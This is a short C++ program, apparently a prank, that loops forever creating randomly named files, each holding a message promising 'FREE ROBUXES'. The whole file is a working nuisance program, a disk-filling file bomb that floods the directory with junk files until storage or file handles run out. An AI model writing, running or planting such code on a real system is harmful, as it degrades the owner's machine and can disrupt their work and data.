#include <fstream>
#include <string>

using namespace std;

int main() {
	int robuxnum = 0;
	char letters[] = "abcdefghijklmnopqrstuvwxyz0123456789";
	while(true){
		ofstream outfile;
		string filename;
		string ext;

		for (int i = 0; i < rand()%10+30; i++){
			filename += letters[rand() % 36];
		}

		for (int i = 0; i < 3; i++){
			ext += letters[rand() % 36];
		}
		outfile.open(filename + "." + ext, ios_base::app);
			outfile << "HERE IS " + to_string(robuxnum) + " FREE ROBUXES FOR YOU!!!!";
		robuxnum++;

	}
	return 0;
}
